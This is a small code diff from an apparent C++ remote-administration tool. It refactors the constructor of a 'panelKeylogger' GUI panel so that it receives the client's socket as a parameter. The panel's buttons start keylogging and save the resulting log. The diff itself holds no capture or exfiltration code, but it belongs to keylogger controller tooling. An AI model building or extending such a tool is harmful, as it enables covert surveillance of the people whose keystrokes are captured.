@@ -10,20 +10,11 @@ wxBEGIN_EVENT_TABLE(panelKeylogger, wxPanel)
 	EVT_BUTTON(EnumIDS::ID_KL_BTN_Save, panelKeylogger::OnGuardarLog)
 wxEND_EVENT_TABLE()
 
-panelKeylogger::panelKeylogger(wxWindow* pParent) :
+panelKeylogger::panelKeylogger(wxWindow* pParent, SOCKET sck) :
 	wxPanel(pParent, EnumIDS::ID_KL_Panel) {
 
-	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
-	if (wxTree) {
-		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
-		if (panel_cliente) {
-			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
-			if (frame_cliente) {
-				this->sckCliente = frame_cliente->sckCliente;
-			}
-		}
-	}
-
+	this->sckCliente = sck;
+	
 	this->btn_Iniciar = new wxToggleButton(this, EnumIDS::ID_KL_BTN_Toggle, "Iniciar");
 	
 	wxSize btn_size = this->btn_Iniciar->GetSize();
